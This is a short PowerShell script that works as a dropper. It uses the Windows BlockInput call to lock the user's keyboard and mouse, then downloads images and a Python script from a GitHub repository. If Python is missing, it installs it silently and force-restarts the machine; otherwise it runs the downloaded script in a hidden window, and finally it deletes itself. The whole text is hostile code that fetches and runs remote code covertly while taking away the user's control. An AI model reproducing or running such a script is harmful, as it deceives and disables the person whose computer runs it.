$cSharpCode = @"
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool block);
"@
$userInput = Add-Type -MemberDefinition $cSharpCode -Name DeactivateInput -PassThru
function DisableUserInputAndRunScript() {
    $userInput::BlockInput($true)
    try {
        Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/Patrick1.png" -OutFile "Patrick1.png"
        Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/Patrick2.png" -OutFile "Patrick2.png"
        Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/Spongebob.png" -OutFile "Spongebob.png"
        Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/TryCatchMe.py" -OutFile "script.py"
        $p = &{python -V} 2>&1
        $version = if($p -is [System.Management.Automation.ErrorRecord]) { Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe" -OutFile "Python-Install.exe"; Start-Process -FilePath "powershell" -ArgumentList "Start-Process 'Python-Install.exe' -ArgumentList '/passive InstallAllUsers=0 PrependPath=1' -NoNewWindow -Wait -WindowStyle Hidden" -WindowStyle Hidden -Wait; Remove-Item "Python-Install.exe"; $userInput::BlockInput($false); Restart-Computer} else { Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden }    } finally {
        $userInput::BlockInput($false)
    }
}
DisableUserInputAndRunScript | Out-Null
Remove-Item "t.ps1"
